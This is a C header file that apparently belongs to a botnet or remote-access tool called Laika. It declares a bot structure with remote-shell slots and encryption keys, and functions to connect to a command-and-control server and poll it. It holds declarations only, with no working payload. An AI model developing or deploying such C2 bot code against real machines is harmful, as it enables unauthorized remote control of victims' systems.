#ifndef LAIKA_BOT_H
#define LAIKA_BOT_H

#include "core/lsodium.h"
#include "core/ltask.h"
#include "laika.h"
#include "net/lpacket.h"
#include "net/lpeer.h"
#include "net/lpolllist.h"
#include "net/lsocket.h"

struct sLaika_shell;
struct sLaika_bot
{
    uint8_t priv[crypto_kx_SECRETKEYBYTES], pub[crypto_kx_PUBLICKEYBYTES];
    struct sLaika_shell *shells[LAIKA_MAX_SHELLS];
    struct sLaika_pollList pList;
    struct sLaika_taskService tService;
    struct sLaika_peer *peer;
    struct sLaika_task *shellTask;
    int activeShells;
};

struct sLaika_bot *laikaB_newBot(void);
void laikaB_freeBot(struct sLaika_bot *bot);

/* can throw a LAIKA_ERROR */
void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port);
bool laikaB_poll(struct sLaika_bot *bot);

void laikaB_pingTask(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick,
                     void *uData);

#endif